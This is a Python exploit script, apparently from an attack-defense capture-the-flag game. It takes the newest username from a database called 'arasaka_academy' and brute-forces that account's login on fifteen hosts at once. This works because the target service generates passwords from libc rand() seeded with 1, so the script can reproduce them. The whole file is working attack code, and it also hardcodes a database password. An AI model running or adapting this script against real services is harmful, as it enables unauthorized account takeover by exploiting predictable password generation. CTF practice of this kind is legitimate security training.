#!/usr/bin/env python3
"""
Brute latest account across multiple hosts concurrently.

Steps:
 1) Fetch last account (name) from DB.
 2) Seed libc rand() with 1, skip 130 passwords, then generate up to 1000 passwords.
 3) For each password, try logging in on all configured hosts in parallel; stop on first success.
"""

import socket
import ctypes
import ctypes.util
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Iterable

import psycopg

# --- CONFIG ---
DB_HOST = "127.0.0.1"
DB_PORT = 5432
DB_USER = "postgres"
DB_PASS = "cowwithballs"
DB_NAME = "arasaka_academy"
DB_TABLE = "students"  # "students" or "professors"

# List of target hosts to try concurrently
TARGETS = [(f"10.80.{i}.2", 1337) for i in range(1, 16)]

CONNECT_TIMEOUT = 5
SKIP_PASSWORDS = 130
ATTEMPTS = 1000
# ---------------


libc = ctypes.CDLL(ctypes.util.find_library("c"))


def reset_rand(seed: int = 1) -> None:
    libc.srand(seed)


def next_password() -> str:
    return "".join(chr((libc.rand() % 25) + 65) for _ in range(32))


def fetch_last_username() -> str:
    with psycopg.connect(
        host=DB_HOST,
        port=DB_PORT,
        user=DB_USER,
        password=DB_PASS,
        dbname=DB_NAME,
    ) as conn:
        with conn.cursor() as cur:
            cur.execute(f"SELECT name FROM {DB_TABLE} ORDER BY id DESC LIMIT 1;")
            row = cur.fetchone()
            return row[0] if row else ""


def recv_until(
    sock: socket.socket, marker: bytes, timeout: float = CONNECT_TIMEOUT
) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def try_login(
    target: tuple[str, int], username: str, password: str, as_prof: bool
) -> tuple[bool, bytes, tuple[str, int]]:
    host, port = target
    s = socket.create_connection((host, port), timeout=CONNECT_TIMEOUT)
    recv_until(s, b"Choose:")
    s.sendall(b"1\n")  # Login
    recv_until(s, b"Login as:")
    s.sendall(b"2\n" if as_prof else b"1\n")
    recv_until(s, b"Enter username:")
    s.sendall((username + "\n").encode())
    recv_until(s, b"Enter password:")
    s.sendall((password + "\n").encode())
    banner = recv_until(s, b"Choose:", timeout=3)
    s.close()
    ok = b"Student" in banner or b"Professor" in banner or b"Get info" in banner
    return ok, banner, target


def brute(username: str, targets: Iterable[tuple[str, int]], as_prof: bool) -> None:
    reset_rand(1)
    for _ in range(SKIP_PASSWORDS):
        next_password()

    for attempt in range(1, ATTEMPTS + 1):
        pwd = next_password()
        print(f"[.] attempt {attempt} password {pwd}")
        with ThreadPoolExecutor(max_workers=len(TARGETS)) as pool:
            futures = {
                pool.submit(try_login, tgt, username, pwd, as_prof): tgt
                for tgt in targets
            }
            for fut in as_completed(futures):
                try:
                    ok, banner, tgt = fut.result()
                except Exception as e:
                    print(f"[!] {futures[fut]} error: {e}")
                    continue
                if ok:
                    print(f"[OK] host={tgt[0]}:{tgt[1]} user={username} pass={pwd}")
                    for line in banner.decode(errors="ignore").splitlines()[:5]:
                        print("  ", line)
                    return
    print("[!] No success within attempt limit")


def main() -> None:
    username = fetch_last_username()
    if not username:
        print("[!] No accounts in DB")
        return
    print(f"[+] Target username: {username}")
    brute(username, TARGETS, as_prof=(DB_TABLE == "professors"))


if __name__ == "__main__":
    main()
